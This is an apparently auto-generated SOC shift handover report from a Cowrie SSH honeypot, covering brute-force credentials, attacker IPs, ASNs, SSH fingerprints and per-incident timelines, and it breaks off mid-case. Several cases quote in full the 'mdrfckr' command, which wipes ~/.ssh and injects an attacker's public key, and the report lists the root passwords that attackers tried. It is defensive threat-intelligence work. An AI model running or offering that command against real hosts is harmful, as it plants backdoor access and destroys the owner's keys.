# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-14 |
| **Generated At** | 2026-04-14T22:52:02Z |
| **Shift Time** | 22:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **193** |
| Confirmed Threats | **170** |
| False Positives Filtered | **23** (11.9%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **6** |
| High Severity Cases | **54** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **139** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **126** |
| Unique Credential Pairs | **68** |
| Unique Usernames | **34** |
| Unique Passwords | **66** |
| Successful Auth Pairs | **32** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 54 |
| `345gs5662d34` | 26 |
| `steam` | 7 |
| `ubuntu` | 5 |
| `postgres` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 26 |
| `3245gs5662d34` | 26 |
| `123456` | 4 |
| `362514` | 2 |
| `02041992Ionela` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 26 |
| `root` | `3245gs5662d34` | 26 |
| `root` | `362514` | 2 |
| `ubuntu` | `02041992Ionela` | 2 |
| `ubuntu` | `abcd@1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `A123456F` | `172.185.24.228` | 2026-04-14T20:59:08 |
| `root` | `3245gs5662d34` | `172.185.24.228` | 2026-04-14T20:59:13 |
| `root` | `Qazwsx2025` | `42.96.43.148` | 2026-04-14T20:59:34 |
| `root` | `3245gs5662d34` | `42.96.43.148` | 2026-04-14T20:59:37 |
| `root` | `362514` | `14.103.73.80` | 2026-04-14T20:59:37 |
| `root` | `3245gs5662d34` | `14.103.73.80` | 2026-04-14T20:59:43 |
| `root` | `wiki123` | `107.174.82.77` | 2026-04-14T21:01:32 |
| `root` | `3245gs5662d34` | `107.174.82.77` | 2026-04-14T21:01:39 |
| `root` | `QWE123qwe` | `14.103.73.80` | 2026-04-14T21:01:55 |
| `root` | `1qazxsw2#EDC` | `107.174.82.77` | 2026-04-14T21:02:01 |
| `root` | `Admin1!` | `107.174.82.77` | 2026-04-14T21:02:47 |
| `root` | `ccBB1234` | `107.174.82.77` | 2026-04-14T21:03:27 |
| `root` | `P@SSW0RD` | `14.103.73.80` | 2026-04-14T21:03:51 |
| `root` | `Pass12345` | `107.174.82.77` | 2026-04-14T21:03:54 |
| `root` | `Qazwsx2024$` | `107.174.82.77` | 2026-04-14T21:04:07 |
| `root` | `Aa123654@` | `107.174.82.77` | 2026-04-14T21:04:34 |
| `root` | `CCdd123123` | `107.174.82.77` | 2026-04-14T21:05:01 |
| `root` | `Qaz@123456` | `107.174.82.77` | 2026-04-14T21:05:14 |
| `root` | `qazwsx6666!@#` | `107.174.82.77` | 2026-04-14T21:06:19 |
| `root` | `admin123.` | `107.174.82.77` | 2026-04-14T21:06:32 |
| `root` | `362514` | `42.96.43.148` | 2026-04-14T21:06:55 |
| `root` | `Asdf12345` | `172.185.24.228` | 2026-04-14T21:07:55 |
| `root` | `Reset@123` | `172.185.24.228` | 2026-04-14T21:09:44 |
| `root` | `abcdabcd` | `172.185.24.228` | 2026-04-14T21:11:35 |
| `root` | `Qazwsx1111111!` | `172.185.24.228` | 2026-04-14T21:13:22 |
| `root` | `ZAQ!2wsx654321..` | `172.185.24.228` | 2026-04-14T21:15:10 |
| `root` | `Qwertyu1234567` | `42.96.43.148` | 2026-04-14T21:16:03 |
| `root` | `Qq123123!` | `42.96.43.148` | 2026-04-14T21:19:36 |
| `root` | `Cx123456` | `42.96.43.148` | 2026-04-14T21:21:24 |
| `root` | `P@SSW0RD` | `42.96.43.148` | 2026-04-14T21:33:57 |
| `root` | `uEvePv4EuR` | `42.192.12.221` | 2026-04-14T21:52:27 |
| `root` | ` ` | `104.131.3.211` | 2026-04-14T22:02:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **193** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 158 |
| Unknown | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 151 | 8 |
| `1b8acd46a07d...` | Modern SSH client | 1 | 1 |
| `4e066189c3bb...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 151 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 7 | 2 | — |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |
| `4e066189c3bb...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 26 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.73.80`, `107.174.82.77`, `42.96.43.148`, `172.185.24.228`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **13** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS45903` | CMC Telecom Infrastructure Company | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (53)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-34b28559d231

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:59 |
| **Last Seen** | 2026-04-14 20:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:59:07` | `cowrie.client.kex` |
| `2026-04-14 20:59:08` | `cowrie.login.success` |
| `2026-04-14 20:59:08` | `cowrie.session.params` |
| `2026-04-14 20:59:08` | `cowrie.command.input` |
| `2026-04-14 20:59:08` | `cowrie.command.failed` |
| `2026-04-14 20:59:08` | `cowrie.log.closed` |
| `2026-04-14 20:59:09` | `cowrie.session.params` |
| `2026-04-14 20:59:09` | `cowrie.command.input` |
| `2026-04-14 20:59:09` | `cowrie.session.file_download` |
| `2026-04-14 20:59:09` | `cowrie.log.closed` |
| `2026-04-14 20:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9505e6495da1

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:59 |
| **Last Seen** | 2026-04-14 20:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:59:12` | `cowrie.session.connect` |
| `2026-04-14 20:59:12` | `cowrie.client.version` |
| `2026-04-14 20:59:12` | `cowrie.client.kex` |
| `2026-04-14 20:59:13` | `cowrie.login.success` |
| `2026-04-14 20:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ea2c19a1678

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 20:59 |
| **Last Seen** | 2026-04-14 20:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:59:33` | `cowrie.session.connect` |
| `2026-04-14 20:59:33` | `cowrie.client.version` |
| `2026-04-14 20:59:33` | `cowrie.client.kex` |
| `2026-04-14 20:59:34` | `cowrie.login.success` |
| `2026-04-14 20:59:34` | `cowrie.session.params` |
| `2026-04-14 20:59:34` | `cowrie.command.input` |
| `2026-04-14 20:59:34` | `cowrie.command.failed` |
| `2026-04-14 20:59:34` | `cowrie.log.closed` |
| `2026-04-14 20:59:34` | `cowrie.session.params` |
| `2026-04-14 20:59:34` | `cowrie.command.input` |
| `2026-04-14 20:59:34` | `cowrie.session.file_download` |
| `2026-04-14 20:59:34` | `cowrie.log.closed` |
| `2026-04-14 20:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca1fc65a14c

| Field | Detail |
|---|---|
| **Source IP** | `14.103.73[.]80` |
| **First Seen** | 2026-04-14 20:59 |
| **Last Seen** | 2026-04-14 20:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:59:35` | `cowrie.session.connect` |
| `2026-04-14 20:59:35` | `cowrie.client.version` |
| `2026-04-14 20:59:35` | `cowrie.client.kex` |
| `2026-04-14 20:59:37` | `cowrie.login.success` |
| `2026-04-14 20:59:37` | `cowrie.session.params` |
| `2026-04-14 20:59:37` | `cowrie.command.input` |
| `2026-04-14 20:59:37` | `cowrie.command.failed` |
| `2026-04-14 20:59:38` | `cowrie.log.closed` |
| `2026-04-14 20:59:38` | `cowrie.session.params` |
| `2026-04-14 20:59:38` | `cowrie.command.input` |
| `2026-04-14 20:59:38` | `cowrie.session.file_download` |
| `2026-04-14 20:59:38` | `cowrie.log.closed` |
| `2026-04-14 20:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.73[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.73[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9768b6af3e39

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 20:59 |
| **Last Seen** | 2026-04-14 20:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:59:36` | `cowrie.session.connect` |
| `2026-04-14 20:59:36` | `cowrie.client.version` |
| `2026-04-14 20:59:36` | `cowrie.client.kex` |
| `2026-04-14 20:59:37` | `cowrie.login.success` |
| `2026-04-14 20:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83a20140cedc

| Field | Detail |
|---|---|
| **Source IP** | `14.103.73[.]80` |
| **First Seen** | 2026-04-14 20:59 |
| **Last Seen** | 2026-04-14 20:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:59:43` | `cowrie.session.connect` |
| `2026-04-14 20:59:43` | `cowrie.client.version` |
| `2026-04-14 20:59:43` | `cowrie.client.kex` |
| `2026-04-14 20:59:43` | `cowrie.login.success` |
| `2026-04-14 20:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.73[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.73[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c3a017ea071

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:01 |
| **Last Seen** | 2026-04-14 21:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:01:31` | `cowrie.session.connect` |
| `2026-04-14 21:01:31` | `cowrie.client.version` |
| `2026-04-14 21:01:31` | `cowrie.client.kex` |
| `2026-04-14 21:01:32` | `cowrie.login.success` |
| `2026-04-14 21:01:33` | `cowrie.session.params` |
| `2026-04-14 21:01:33` | `cowrie.command.input` |
| `2026-04-14 21:01:33` | `cowrie.command.failed` |
| `2026-04-14 21:01:33` | `cowrie.log.closed` |
| `2026-04-14 21:01:34` | `cowrie.session.params` |
| `2026-04-14 21:01:34` | `cowrie.command.input` |
| `2026-04-14 21:01:34` | `cowrie.session.file_download` |
| `2026-04-14 21:01:34` | `cowrie.log.closed` |
| `2026-04-14 21:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53314712d114

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:01 |
| **Last Seen** | 2026-04-14 21:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:01:38` | `cowrie.session.connect` |
| `2026-04-14 21:01:38` | `cowrie.client.version` |
| `2026-04-14 21:01:38` | `cowrie.client.kex` |
| `2026-04-14 21:01:39` | `cowrie.login.success` |
| `2026-04-14 21:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b81f0a907218

| Field | Detail |
|---|---|
| **Source IP** | `14.103.73[.]80` |
| **First Seen** | 2026-04-14 21:01 |
| **Last Seen** | 2026-04-14 21:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:01:54` | `cowrie.session.connect` |
| `2026-04-14 21:01:54` | `cowrie.client.version` |
| `2026-04-14 21:01:54` | `cowrie.client.kex` |
| `2026-04-14 21:01:55` | `cowrie.login.success` |
| `2026-04-14 21:01:55` | `cowrie.session.params` |
| `2026-04-14 21:01:55` | `cowrie.command.input` |
| `2026-04-14 21:01:55` | `cowrie.command.failed` |
| `2026-04-14 21:01:55` | `cowrie.log.closed` |
| `2026-04-14 21:01:56` | `cowrie.session.params` |
| `2026-04-14 21:01:56` | `cowrie.command.input` |
| `2026-04-14 21:01:56` | `cowrie.session.file_download` |
| `2026-04-14 21:01:56` | `cowrie.log.closed` |
| `2026-04-14 21:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.73[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.73[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7457cae2ea77

| Field | Detail |
|---|---|
| **Source IP** | `14.103.73[.]80` |
| **First Seen** | 2026-04-14 21:01 |
| **Last Seen** | 2026-04-14 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:01:58` | `cowrie.session.connect` |
| `2026-04-14 21:01:59` | `cowrie.client.version` |
| `2026-04-14 21:01:59` | `cowrie.client.kex` |
| `2026-04-14 21:01:59` | `cowrie.login.success` |
| `2026-04-14 21:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.73[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.73[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b63bf8fa34a

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:01 |
| **Last Seen** | 2026-04-14 21:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:01:59` | `cowrie.session.connect` |
| `2026-04-14 21:01:59` | `cowrie.client.version` |
| `2026-04-14 21:01:59` | `cowrie.client.kex` |
| `2026-04-14 21:02:01` | `cowrie.login.success` |
| `2026-04-14 21:02:01` | `cowrie.session.params` |
| `2026-04-14 21:02:01` | `cowrie.command.input` |
| `2026-04-14 21:02:01` | `cowrie.command.failed` |
| `2026-04-14 21:02:01` | `cowrie.log.closed` |
| `2026-04-14 21:02:02` | `cowrie.session.params` |
| `2026-04-14 21:02:02` | `cowrie.command.input` |
| `2026-04-14 21:02:02` | `cowrie.session.file_download` |
| `2026-04-14 21:02:02` | `cowrie.log.closed` |
| `2026-04-14 21:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b42ee7de5a3b

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:02 |
| **Last Seen** | 2026-04-14 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:02:05` | `cowrie.session.connect` |
| `2026-04-14 21:02:05` | `cowrie.client.version` |
| `2026-04-14 21:02:06` | `cowrie.client.kex` |
| `2026-04-14 21:02:07` | `cowrie.login.success` |
| `2026-04-14 21:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2515f0a305c

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:02 |
| **Last Seen** | 2026-04-14 21:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
